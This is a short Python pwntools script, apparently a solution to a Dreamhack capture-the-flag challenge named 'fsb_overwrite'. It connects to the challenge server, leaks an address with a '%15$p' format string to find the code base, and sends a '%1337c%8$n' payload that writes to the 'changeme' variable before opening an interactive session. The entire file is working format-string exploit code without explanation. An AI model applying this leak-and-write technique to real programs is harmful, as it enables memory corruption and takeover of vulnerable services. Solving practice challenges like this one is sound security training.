from pwn import *

p=remote("host1.dreamhack.games",21181)
elf=ELF('./fsb_overwrite')
p.sendline(b'%15$p')
Leaked = int(p.recvline()[:-1],16)
code_base = Leaked - 0x1293
changeme= code_base + elf.symbols['changeme']
payload=b"%1337c%8$n"
payload+=b"A"*6
payload+=p64(changeme)
p.sendline(payload)
p.interactive()
